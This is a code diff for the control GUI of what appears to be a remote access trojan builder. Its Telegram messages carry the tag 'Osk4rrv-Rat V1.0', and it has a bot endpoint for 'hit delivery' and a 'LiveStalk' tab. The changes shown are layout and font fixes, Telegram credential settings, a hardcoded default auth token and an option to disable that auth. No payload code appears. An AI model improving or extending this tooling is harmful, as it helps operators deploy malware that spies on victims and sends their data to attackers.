+        ImFont* subFont = fontMedium ? fontMedium : ImGui::GetFont();
+        const ImVec2 subSize = subFont->CalcTextSizeA(
+            subFont->LegacySize, FLT_MAX, 0.0f, sub);
+
+        const float blockH = titleSize.y + 12.0f + subSize.y;
+        const float startY = (panelSize.y - blockH) * 0.5f;
+
+        ImGui::SetCursorPos(ImVec2(0.0f, startY));
+        if (fontHeading) ImGui::PushFont(fontHeading, fontHeading->LegacySize);
+        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
+        ImGui::SetCursorPosX((panelSize.x - titleSize.x) * 0.5f);
+        ImGui::TextUnformatted(title);
+        ImGui::PopStyleColor();
+        if (fontHeading) ImGui::PopFont();
+
+        if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
+        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
+        // Center the subtitle as well so the block reads as one unit.
+        const float subLineY = startY + titleSize.y + 12.0f;
+        ImGui::SetCursorPos(ImVec2((panelSize.x - subSize.x) * 0.5f, subLineY));
+        ImGui::TextUnformatted(sub);
+        ImGui::PopStyleColor();
+        if (fontMedium) ImGui::PopFont();
+    }
+    ImGui::EndChild();
+    ImGui::PopStyleColor(2);
+    ImGui::PopStyleVar();
+}
+
+static void drawEndpointTab() {
+    const ImVec2 contentSize = ImGui::GetWindowSize();
+    drawPageHeader("Endpoint", "Telegram bot delivery endpoint");
+
+    ImGui::SetCursorPos(ImVec2(Ui::ContentPadding, 88.0f));
+    ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(18.0f, 16.0f));
+    ImGui::PushStyleColor(ImGuiCol_ChildBg, Ui::Surface);
+    ImGui::PushStyleColor(ImGuiCol_Border, Ui::Border);
+    // 220px hugs the content (header block + divider + three status rows ≈ 195px).
+    // It was 300px, which left ~115px of dead space once the divider stopped being
+    // pinned 23px lower than the header actually needed.
+    if (ImGui::BeginChild(
+            "##endpoint_tab",
+            ImVec2(contentSize.x - Ui::ContentPadding * 2.0f, 220.0f),
+            ImGuiChildFlags_Borders,
+            ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse)) {
+
+        // === TELEGRAM CONFIG SECTION ===
+        // The header block is measured first so the action buttons can be centred
+        // against its real height instead of a guessed Y.
+        const float padX = ImGui::GetCursorPosX();
+        const float headerTop = ImGui::GetCursorPosY();
+        if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
+        ImGui::TextUnformatted("Telegram Configuration");
+        if (fontMedium) ImGui::PopFont();
+        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
+        ImGui::TextUnformatted("Bot delivery endpoint settings.");
+        ImGui::PopStyleColor();
+        const float headerBottom = ImGui::GetCursorPosY() - ImGui::GetStyle().ItemSpacing.y;
+
+        // Header action row: Connect + Configure, right-aligned.
+        //
+        // ImGui::Button(label, size) is exactly `size` wide — FramePadding only
+        // positions the label inside that box, it does not add to the width. The
+        // previous code reserved W + 24 per button on the assumption that it did,
+        // so the pair drifted apart with a gap far wider than the intended 10px
+        // instead of sitting neatly against the panel edge.
+        const float headerGap = 10.0f;
+        const float buttonH = 34.0f;
+        const float connectW = 96.0f, configureW = 118.0f;
+        const float contentRight = ImGui::GetContentRegionMax().x;
+        const float configureX = contentRight - configureW;
+        const float connectX = configureX - headerGap - connectW;
+
+        // Vertically centred on the title/subtitle block, so the buttons read as
+        // the header's actions rather than as a second row under it.
+        const float buttonY = headerTop + (headerBottom - headerTop - buttonH) * 0.5f;
+
+        ImGui::SetCursorPos(ImVec2(connectX, buttonY));
+        if (styledButton("Connect", ImVec2(connectW, buttonH), false)) {
+            if (strlen(botTokenBuf) > 0 && strlen(chatIdBuf) > 0) {
+                telegram.setConfig(botTokenBuf, chatIdBuf);
+                telegram.verifyConnectionAsync();
+            }
+        }
+        // "Configure" opens the setup wizard. Previously labelled "Save"/"Setup"
+        // depending on whether a config had been loaded, which read like a second
+        // save action next to the Save buttons in Settings.
+        ImGui::SetCursorPos(ImVec2(configureX, buttonY));
+        if (styledButton("Configure", ImVec2(configureW, buttonH), true))
+            showTelegramPopup = true;
+
+        // Divider under the header block, at a Y derived from the header rather
+        // than the old hardcoded 103.
+        ImGui::SetCursorPos(ImVec2(padX, headerBottom + 20.0f));
+        ImGui::Separator();
+        ImGui::Dummy(ImVec2(0.0f, 12.0f));
+
+        const StatusPresentation status = getStatusPresentation();
+
+        // Telegram status
+        drawInfoRow("Telegram", status.label, status.color);
+
+        // Bot token state
+        const bool tokenSet = strlen(botTokenBuf) > 0;
+        drawInfoRow("Bot Token", tokenSet ? "Configured" : "Missing",
+            tokenSet ? Ui::TextSecondary : Ui::TextMuted);
+
+        // Chat ID state
+        const bool chatSet = strlen(chatIdBuf) > 0;
+        drawInfoRow("Chat ID", chatSet ? "Configured" : "Missing",
+            chatSet ? Ui::TextSecondary : Ui::TextMuted);
     }
     ImGui::EndChild();
     ImGui::PopStyleColor(2);
@@ -1837,77 +2701,160 @@ static void drawBuildTab() {
 }
 
 static void drawSettingsTab() {
-    const float width = ImGui::GetWindowSize().x;
-    drawPageHeader("Telegram", "Bot delivery endpoint");
+    const ImVec2 contentSize = ImGui::GetWindowSize();
+    drawPageHeader("Settings", "Application authentication");
+
+    // The panel fills whatever is left under the page header and scrolls when its
+    // content does not fit. At the default 760x500 window only ~292px is available
+    // here while the form needs ~500px, so the old fixed 430px panel simply ran off
+    // the bottom with no way to reach the Startup section.
+    //
+    // Clamped with a ternary rather than std::max(): <windows.h> (pulled in by
+    // shlobj.h) defines min/max as macros, which breaks qualified std::max calls.
+    const float availableH = contentSize.y - 88.0f - Ui::ContentPadding;
+    const float panelH = availableH > 180.0f ? availableH : 180.0f;
 
     ImGui::SetCursorPos(ImVec2(Ui::ContentPadding, 88.0f));
     ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(18.0f, 16.0f));
     ImGui::PushStyleColor(ImGuiCol_ChildBg, Ui::Surface);
     ImGui::PushStyleColor(ImGuiCol_Border, Ui::Border);
     if (ImGui::BeginChild(
-            "##telegram_integration",
-            ImVec2(width - Ui::ContentPadding * 2.0f, 190.0f),
+            "##settings_tab",
+            ImVec2(contentSize.x - Ui::ContentPadding * 2.0f, panelH),
             ImGuiChildFlags_Borders,
-            ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse)) {
-        const ImVec2 panelPos = ImGui::GetWindowPos();
-        const ImVec2 panelSize = ImGui::GetWindowSize();
-        ImDrawList* dl = ImGui::GetWindowDrawList();
-        const StatusPresentation status = getStatusPresentation();
+            0)) {
 
+        // === APP AUTH TOKEN SECTION ===
         if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
-        ImGui::TextUnformatted("Endpoint");
+        ImGui::TextUnformatted("App Auth Token");
         if (fontMedium) ImGui::PopFont();
         ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
-        ImGui::TextUnformatted("Token and chat for hit delivery.");
+        ImGui::TextUnformatted("Token required to unlock the builder at startup.");
         ImGui::PopStyleColor();
 
-        ImGui::SetCursorPos(ImVec2(panelSize.x - 240.0f, 16.0f));
-        if (styledButton("Connect", ImVec2(100.0f, 36.0f), false)) {
-            if (strlen(botTokenBuf) > 0 && strlen(chatIdBuf) > 0) {
-                telegram.setConfig(botTokenBuf, chatIdBuf);
-                telegram.verifyConnectionAsync();
+        ImGui::Dummy(ImVec2(0.0f, 8.0f));
+
+        // Show/hide toggle for the token field.
+        //
+        // ImGui::Button(label, size) is exactly `size` wide — FramePadding only
+        // positions the label inside that box, it does not add to it. The old code
+        // reserved an extra 24px per button on the assumption that it did, which
+        // left the field and the action row short of the panel edge. Everything is
+        // sized from real widths now.
+        static bool showAuthToken = false;
+        // Content width excluding the scrollbar, so the row still ends flush once
+        // the panel starts scrolling.
+        const float contentW = ImGui::GetContentRegionMax().x;
+        const float showW = 80.0f;
+        const float gap = 8.0f;
+
+        ImGui::SetNextItemWidth(contentW - showW - gap);
+        ImGui::InputText("##app_auth_input", authTokenBuf, sizeof(authTokenBuf),
+            showAuthToken ? 0 : ImGuiInputTextFlags_Password);
+        ImGui::SameLine(0.0f, gap);
+        if (styledButton(showAuthToken ? "Hide" : "Show", ImVec2(showW, 32.0f), false))
+            showAuthToken = !showAuthToken;
+
+        // Tight gap: these two actions belong with the field above them, and a
+        // large spacer here read as if they were a separate section.
+        ImGui::Dummy(ImVec2(0.0f, 2.0f));
+
+        // Action row. "Reset to default" is only drawn when both buttons plus the
+        // gap genuinely fit, so the pair can never wrap into a column.
+        const float saveW = 120.0f, resetW = 150.0f;
+        {
+            ImGui::BeginGroup();
+            if (styledButton("Save token", ImVec2(saveW, 34.0f), true)) {
+                if (strlen(authTokenBuf) > 0) {
+                    saveConfigToAppData();
+                    authTokenSavedOk = true;
+                    authTokenSavedAt = (float)ImGui::GetTime();
+                } else {
+                    authTokenSavedOk = false;
+                }
             }
+            if (saveW + 10.0f + resetW <= contentW) {
+                ImGui::SameLine(0.0f, 10.0f);
+                if (styledButton("Reset to default", ImVec2(resetW, 34.0f), false)) {
+                    strncpy_s(authTokenBuf, "sk-7nR9pL2mK8qW5vT3", sizeof(authTokenBuf) - 1);
+                    saveConfigToAppData();
+                    authTokenSavedOk = true;
+                    authTokenSavedAt = (float)ImGui::GetTime();
+                }
+            }
+            ImGui::EndGroup();
         }
-        ImGui::SetCursorPos(ImVec2(panelSize.x - 128.0f, 16.0f));
-        if (styledButton(configLoaded ? "Edit" : "Setup", ImVec2(108.0f, 36.0f), true))
-            showTelegramPopup = true;
 
-        dl->AddLine(
-            ImVec2(panelPos.x + 18.0f, panelPos.y + 68.0f),
-            ImVec2(panelPos.x + panelSize.x - 18.0f, panelPos.y + 68.0f),
-            Ui::color(Ui::Border));
+        // Confirmation hint in a reserved slot, so showing or hiding it never
+        // moves the sections below.
+        const float hintTop = ImGui::GetCursorPosY();
+        if (authTokenSavedOk && (float)ImGui::GetTime() - authTokenSavedAt < 3.0f) {
+            ImGui::Dummy(ImVec2(0.0f, 4.0f));
+            ImGui::PushStyleColor(ImGuiCol_Text, Ui::Success);
+            ImGui::TextUnformatted("Saved");
+            ImGui::PopStyleColor();
+        }
+        ImGui::SetCursorPosY(hintTop + 4.0f + ImGui::GetTextLineHeight() + 6.0f);
 
-        const ImVec2 statusSize = ImGui::CalcTextSize(status.label);
-        ImGui::SetCursorPos(ImVec2(18.0f, 82.0f));
-        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
-        ImGui::TextUnformatted("Status");
-        ImGui::PopStyleColor();
-        ImGui::SetCursorPos(ImVec2(panelSize.x - 18.0f - statusSize.x, 82.0f));
-        ImGui::PushStyleColor(ImGuiCol_Text, status.color);
-        ImGui::TextUnformatted(status.label);
-        ImGui::PopStyleColor();
+        // Divider between the token form and the read-only status rows.
+        //
+        // Submitted as a Separator rather than a draw-list line: a draw-list line
+        // is placed in window coordinates, so it would stay pinned while the
+        // content scrolled underneath it. Separator() is a real item, follows the
+        // scroll offset, and stops before the scrollbar.
+        ImGui::Separator();
+        ImGui::Dummy(ImVec2(0.0f, 10.0f));
 
-        const char* tokenState = configLoaded ? "Configured" : "Missing";
-        const ImVec2 tokenSize = ImGui::CalcTextSize(tokenState);
-        ImGui::SetCursorPos(ImVec2(18.0f, 116.0f));
-        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
-        ImGui::TextUnformatted("Token");
-        ImGui::PopStyleColor();
-        ImGui::SetCursorPos(ImVec2(panelSize.x - 18.0f - tokenSize.x, 116.0f));
-        ImGui::PushStyleColor(ImGuiCol_Text, configLoaded ? Ui::TextSecondary : Ui::TextMuted);
-        ImGui::TextUnformatted(tokenState);
-        ImGui::PopStyleColor();
+        // Auth status. Reflects the Disable app auth toggle, so "Disabled" is
+        // shown rather than a misleading "Active" once the guard is turned off.
+        const char* authStateLabel = disableAppAuth ? "Disabled" : (authLoggedIn ? "Active" : "Inactive");
+        const ImVec4 authStateColor = disableAppAuth ? Ui::TextMuted
+            : (authLoggedIn ? Ui::Success : Ui::Danger);
+        drawInfoRow("Auth Status", authStateLabel, authStateColor);
 
-        const char* storageState = configLoaded ? "AppData" : "None";
-        const ImVec2 storageSize = ImGui::CalcTextSize(storageState);
-        ImGui::SetCursorPos(ImVec2(18.0f, 150.0f));
-        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
-        ImGui::TextUnformatted("Storage");
+        // Token source
+        const char* srcState = authTokenIsDefault ? "Default" : "Custom";
+        drawInfoRow("Token Source", srcState, authTokenIsDefault ? Ui::TextMuted : Ui::Accent);
+
+        // Storage location
+        drawInfoRow("Storage", "config.ini", Ui::TextSecondary);
+
+        // === STARTUP SECTION ===
+        ImGui::Dummy(ImVec2(0.0f, 12.0f));
+        ImGui::Separator();
+        ImGui::Dummy(ImVec2(0.0f, 10.0f));
+
+        if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
+        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
+        ImGui::TextUnformatted("Startup");
         ImGui::PopStyleColor();
-        ImGui::SetCursorPos(ImVec2(panelSize.x - 18.0f - storageSize.x, 150.0f));
-        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextSecondary);
-        ImGui::TextUnformatted(storageState);
-        ImGui::PopStyleColor();
+        if (fontMedium) ImGui::PopFont();
+
+        ImGui::Dummy(ImVec2(0.0f, 10.0f));
+
+        // Row 1: Auto connect. Verify the bot as soon as the app opens, so the
+        // Telegram status is live without pressing Connect every launch.
+        //
+        // No SetCursorPos here: styledToggleRow() positions itself off the current
+        // cursor Y, which keeps the rows flowing (and scrolling) correctly.
+        if (styledToggleRow("##toggle_autoconnect", "Auto connect on application start",
+                &autoConnectOnStart, "Verify the Telegram bot when the app opens")) {
+            saveConfigToAppData();
+        }
+
+        // Row 2: Disable app auth. Skips the token login screen entirely — the
+        // token stays stored, it is just no longer required to get in.
+        if (styledToggleRow("##toggle_disableauth", "Disable app auth",
+                &disableAppAuth, "Open the builder without the token prompt")) {
+            // Turning the guard off while signed out must not strand the UI on
+            // the login screen; treat it as an immediate pass-through.
+            if (disableAppAuth) {
+                authLoggedIn = true;
+                authCheckDone = true;
+                showAuthLogin = false;
+            }
+            saveConfigToAppData();
+        }
     }
     ImGui::EndChild();
     ImGui::PopStyleColor(2);
@@ -1998,7 +2945,13 @@ static void drawTelegramPopup() {
         if (styledButton("Send test", ImVec2(testWidth, 40.0f), false)) {
             if (strlen(botTokenBuf) > 0 && strlen(chatIdBuf) > 0) {
                 telegram.setConfig(botTokenBuf, chatIdBuf);
-                telegram.sendMessageAsync("Connected.\xe2\x9c\x85");
+                // Verbatim on purpose: sendMessageAsync() would stamp the
+                // "[Osk4rrv-Rat V1.0] / Session ID: <id>" header on top, and the
+                // test is meant to read as the payload's own connect line.
+                char testMsg[256];
+                snprintf(testMsg, sizeof(testMsg),
+                    "Connected with session: %s \xe2\x9c\x85", sessionId.c_str());
+                telegram.sendRawMessageAsync(testMsg);
             }
         }
         ImGui::SameLine(0.0f, buttonGap);
@@ -2029,6 +2982,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int) {
         hInstance, nullptr, nullptr, nullptr, nullptr, L"AppBuilder", nullptr };
     RegisterClassExW(&wc);
 
+    // Enable per-monitor DPI awareness for sharp rendering on high-DPI displays
+    SetProcessDpiAwarenessContext(DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2);
+    
     // Medium centered window
     int screenW = GetSystemMetrics(SM_CXSCREEN);
     int screenH = GetSystemMetrics(SM_CYSCREEN);
@@ -2041,15 +2997,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int) {
         posX, posY, WIN_W, WIN_H,
         nullptr, nullptr, wc.hInstance, nullptr);
 
-    typedef HRESULT(WINAPI* DwmSetWindowAttribute_t)(HWND, DWORD, LPCVOID, DWORD);
-    HMODULE dwm = LoadLibraryW(L"dwmapi.dll");
-    if (dwm) {
-        auto pDwm = (DwmSetWindowAttribute_t)GetProcAddress(dwm, "DwmSetWindowAttribute");
-        if (pDwm) {
-            int pref = 2;
-            pDwm(g_hwnd, 33, &pref, sizeof(pref));
-        }
-    }
+    // Round the real window corners (DWM on Win11, a window region on Win10).
+    applyRoundedWindowRegion(g_hwnd);
 
     if (!CreateDeviceD3D(g_hwnd)) {
         CleanupDeviceD3D();
@@ -2067,66 +3016,100 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int) {
     io.IniFilename = nullptr;
 
     ImFontConfig fontCfg;
-    fontCfg.OversampleH = 3;
-    fontCfg.OversampleV = 2;
-    fontCfg.PixelSnapH = true;
+    fontCfg.OversampleH = 3;   // 8 was wasteful and could overflow the atlas on some GPUs
+    fontCfg.OversampleV = 3;
+    fontCfg.PixelSnapH = true; // crisp text at small sizes
     static const ImWchar icons_ranges[] = { ICON_MIN_FA, ICON_MAX_FA, 0 };
-    const char* faPathResolved = nullptr;
+
+    char exePath[MAX_PATH];
+    GetModuleFileNameA(nullptr, exePath, MAX_PATH);
+    std::string exeDir = std::string(exePath).substr(0, std::string(exePath).rfind('\\'));
+
+    // --- Locate the FontAwesome solid font (shipped in assets/fonts) ---
+    std::string faPathResolved;
     {
-        const char* faCandidates[] = {
-            "assets/fonts/fa-solid-900.ttf",
+        std::string faCandidates[] = {
+            exeDir + "\\assets\\fonts\\fa-solid-900.ttf",
+            exeDir + "\\..\\assets\\fonts\\fa-solid-900.ttf",
+            exeDir + "\\..\\..\\assets\\fonts\\fa-solid-900.ttf",
+            "assets\\fonts\\fa-solid-900.ttf",
             "fa-solid-900.ttf",
-            "C:/Users/oziet/Downloads/osk4rrvrat/assets/fonts/fa-solid-900.ttf",
         };
-        for (const char* faPath : faCandidates) {
-            DWORD attr = GetFileAttributesA(faPath);
+        for (const std::string& c : faCandidates) {
+            DWORD attr = GetFileAttributesA(c.c_str());
             if (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
-                faPathResolved = faPath;
+                faPathResolved = c;
                 break;
             }
         }
     }
 
+    // Helper: try a list of font files, return the first that loads. Never returns null.
+    auto loadFont = [&](const std::string* paths, int count, float size) -> ImFont* {
+        for (int i = 0; i < count; ++i) {
+            if (paths[i].empty()) continue;
+            DWORD attr = GetFileAttributesA(paths[i].c_str());
+            if (attr == INVALID_FILE_ATTRIBUTES || (attr & FILE_ATTRIBUTE_DIRECTORY)) continue;
+            ImFont* f = io.Fonts->AddFontFromFileTTF(paths[i].c_str(), size, &fontCfg);
+            if (f) return f;
+        }
+        return nullptr;
+    };
+
+    // Windows fonts: primary (Segoe UI), then safe fallbacks (Tahoma, Arial, Verdana).
+    // NOTE: "segoei.ttf" does not exist on Windows — the correct name is "segoeui.ttf".
+    std::string winRegular[] = {
+        "C:\\Windows\\Fonts\\segoeui.ttf",
+        "C:\\Windows\\Fonts\\tahoma.ttf",
+        "C:\\Windows\\Fonts\\arial.ttf",
+        "C:\\Windows\\Fonts\\verdana.ttf",
+    };
+    std::string winSemiBold[] = {
+        "C:\\Windows\\Fonts\\seguisb.ttf",
+        "C:\\Windows\\Fonts\\segoeuib.ttf",
+        "C:\\Windows\\Fonts\\tahomabd.ttf",
+        "C:\\Windows\\Fonts\\arialbd.ttf",
+    };
+
     auto mergeIcons = [&](ImFont* baseFont) {
-        if (!baseFont || !faPathResolved)
-            return;
+        if (!baseFont || faPathResolved.empty()) return;
         ImFontConfig icons_cfg;
         icons_cfg.MergeMode = true;
         icons_cfg.PixelSnapH = true;
         icons_cfg.GlyphMinAdvanceX = 14.0f;
         icons_cfg.OversampleH = 2;
         icons_cfg.OversampleV = 2;
-        io.Fonts->AddFontFromFileTTF(faPathResolved, baseFont->LegacySize > 0.0f ? baseFont->LegacySize : 14.0f, &icons_cfg, icons_ranges);
+        io.Fonts->AddFontFromFileTTF(
+            faPathResolved.c_str(),
+            baseFont->LegacySize > 0.0f ? baseFont->LegacySize : 18.0f,
+            &icons_cfg, icons_ranges);
     };
 
-    fontBody = io.Fonts->AddFontFromFileTTF("C:\\Windows\\Fonts\\segoeui.ttf", 14.0f, &fontCfg);
-    mergeIcons(fontBody);
-    fontMedium = io.Fonts->AddFontFromFileTTF("C:\\Windows\\Fonts\\seguisb.ttf", 14.0f, &fontCfg);
-    mergeIcons(fontMedium);
-    fontHeading = io.Fonts->AddFontFromFileTTF("C:\\Windows\\Fonts\\seguisb.ttf", 20.0f, &fontCfg);
-    mergeIcons(fontHeading);
-    fontSplash = io.Fonts->AddFontFromFileTTF("C:\\Windows\\Fonts\\seguisb.ttf", 34.0f, &fontCfg);
+    fontBody    = loadFont(winRegular,  (int)(sizeof(winRegular) / sizeof(winRegular[0])),   18.0f);
+    if (fontBody) mergeIcons(fontBody);
+    fontMedium  = loadFont(winSemiBold, (int)(sizeof(winSemiBold) / sizeof(winSemiBold[0])), 18.0f);
+    if (fontMedium) mergeIcons(fontMedium);
+    fontHeading = loadFont(winSemiBold, (int)(sizeof(winSemiBold) / sizeof(winSemiBold[0])), 24.0f);
+    if (fontHeading) mergeIcons(fontHeading);
+    fontSplash  = loadFont(winSemiBold, (int)(sizeof(winSemiBold) / sizeof(winSemiBold[0])), 36.0f);
+    if (fontSplash) mergeIcons(fontSplash);
 
-    // Standalone icons font (for large success glyph etc.)
-    if (faPathResolved) {
+    // Standalone icons font (large success glyph etc.)
+    if (!faPathResolved.empty()) {
         ImFontConfig icons_cfg;
         icons_cfg.PixelSnapH = true;
         icons_cfg.GlyphMinAdvanceX = 14.0f;
         icons_cfg.OversampleH = 2;
         icons_cfg.OversampleV = 2;
-        fontIcons = io.Fonts->AddFontFromFileTTF(faPathResolved, 16.0f, &icons_cfg, icons_ranges);
+        fontIcons = io.Fonts->AddFontFromFileTTF(faPathResolved.c_str(), 16.0f, &icons_cfg, icons_ranges);
     }
 
-    if (!fontBody)
-        fontBody = io.Fonts->AddFontDefault();
-    if (!fontMedium)
-        fontMedium = fontBody;
-    if (!fontHeading)
-        fontHeading = fontMedium;
-    if (!fontSplash)
-        fontSplash = fontHeading;
-    if (!fontIcons)
-        fontIcons = fontBody;
+    // Guarantee every pointer is valid so the UI never renders with a null font.
+    if (!fontBody)    fontBody    = io.Fonts->AddFontDefault();
+    if (!fontMedium)  fontMedium  = fontBody;
+    if (!fontHeading) fontHeading = fontMedium;
+    if (!fontSplash)  fontSplash  = fontHeading;
+    if (!fontIcons)   fontIcons   = fontBody;
     io.FontDefault = fontBody;
 
     applyModernTheme();
@@ -2136,7 +3119,25 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int) {
 
     loadConfigFromAppData();
 
-    showAuthLogin = true;
+    // Settings toggles are applied here, once, after the config is read.
+    //
+    // Disable app auth: skip the login screen entirely. authLoggedIn is set so
+    // the render path treats this exactly like a completed login.
+    if (disableAppAuth) {
+        authLoggedIn = true;
+        authCheckDone = true;
+        showAuthLogin = false;
+    } else {
+        showAuthLogin = true;
+    }
+
+    // Auto connect: verify the bot as soon as the window is up, so the Telegram
+    // status on Home/Endpoint is live without pressing Connect. Only meaningful
+    // when both credentials are present.
+    if (autoConnectOnStart && strlen(botTokenBuf) > 0 && strlen(chatIdBuf) > 0) {
+        telegram.setConfig(botTokenBuf, chatIdBuf);
+        telegram.verifyConnectionAsync();
+    }
 
     ImVec4 clear_color = Ui::Canvas;
     bool done = false;
@@ -2160,7 +3161,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int) {
 
         ImGui::SetNextWindowPos(ImVec2(0, 0));
         ImGui::SetNextWindowSize(io.DisplaySize);
-        ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 10.0f);
+        ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, kWindowRounding);
         ImGui::Begin("##Main", nullptr,
             ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoResize |
             ImGuiWindowFlags_NoMove | ImGuiWindowFlags_NoCollapse |
@@ -2175,7 +3176,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int) {
                 wp,
                 ImVec2(wp.x + ws.x, wp.y + ws.y),
                 Ui::color(Ui::BorderStrong),
-                10.0f,
+                kWindowRounding,
                 0,
                 1.0f);
         }
@@ -2225,6 +3226,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int) {
                 drawBuildTab();
                 break;
             case 2:
+                drawLiveStalkTab();
+                break;
+            case 3:
+                drawEndpointTab();
+                break;
+            case 4:
                 drawSettingsTab();
                 break;
             }
